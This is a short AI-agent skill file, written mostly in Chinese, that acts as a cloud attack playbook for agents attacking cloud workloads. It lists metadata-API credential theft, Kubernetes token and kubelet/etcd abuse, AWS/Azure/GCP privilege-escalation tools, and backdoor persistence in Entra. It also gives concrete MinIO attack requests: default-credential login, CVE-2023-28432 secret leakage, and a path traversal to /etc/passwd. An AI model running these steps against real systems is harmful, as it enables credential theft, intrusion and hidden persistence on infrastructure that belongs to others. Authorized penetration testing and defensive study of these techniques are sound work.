---
name: cloud-attack-methods
description: "Cloud attack playbook: metadata APIs, object storage, AWS/Azure/GCP identity attacks, K8s deep exploitation, MinIO matrix. Use when attacking cloud workloads, containers, or identity planes."
version: 1.0.0
author: Covo Agent
license: MIT
platforms: [linux, macos, windows]
metadata:
  tags: [security, cloud, aws, azure, k8s, iam]
  related_skills: [post-exploitation, active-directory-attack, pentest-verification]
---

## 云攻击手法

本项目 recipe 对照:pacu(AWS 利用框架)、trivy/kube-bench/kube-hunter/prowler/scout-suite(cloud 原生审计)、cloudmapper。

```
=== 云 ===
元数据API: AWS 169.254.169.254/latest/meta-data/iam/ | Azure -H Metadata:true | GCP metadata.google.internal | 阿里云100.100.100.200
对象存储: aws s3 ls --no-sign-request | K8s: /var/run/secrets/.../token → api/v1拿secrets/exec pods → cluster-admin
🚨云身份攻击(拿到key/token后的提权横向):
  AWS: enumerate-iam/cloudfox/ScoutSuite枚举权限 → pacu自动找privesc(iam:PassRole+lambda/ec2/glue等18+条) | STS AssumeRole跨账户 | Lambda环境变量偷密钥
  Azure/Entra: roadtools/AADInternals | 设备码/刷新令牌 | Managed Identity IMDS偷token | Automation Runbook RCE | Key Vault读密钥
  Entra后渗透: GraphRunner(Graph API枚举/加后门App) | 服务主体加凭据(隐蔽持久化) | PRT偷取横向
  GCP: 服务账户token(metadata) | serviceAccountTokenCreator/actAs提权
🚨K8s深入: kubelet 10250未授权(/pods,/exec进任意容器) | etcd 2379无认证读全secrets | API Server匿名 | RBAC过权SA(kubectl auth can-i --list) | 特权pod挂宿主逃逸
🚨MinIO攻击矩阵:
  指纹: Server: MinIO | /minio/health/live → 200 | 9000(API)+9001(Console)
  Console爆破: POST :9001/api/v1/login body={"accessKey":"minioadmin","secretKey":"minioadmin"}
  CVE-2023-28432: POST /minio/health/cluster?verify → 环境变量泄露MINIO_SECRET_KEY
  CVE-2023-28434: 路径穿越 /bucket/..%2F..%2Fetc/passwd | 匿名访问: GET /bucket-name/ → 200=匿名读
🚨阿里云FC函数(fcapp.run)枚举: *.cn-{region}.fcapp.run | 405=只接受GET | 200+{"code":200,"msg":"Forbidden"}=路径存在缺参数 | GET /{path}/{id}.html → 302泄露真实CDN域名+auth_key签名URL
```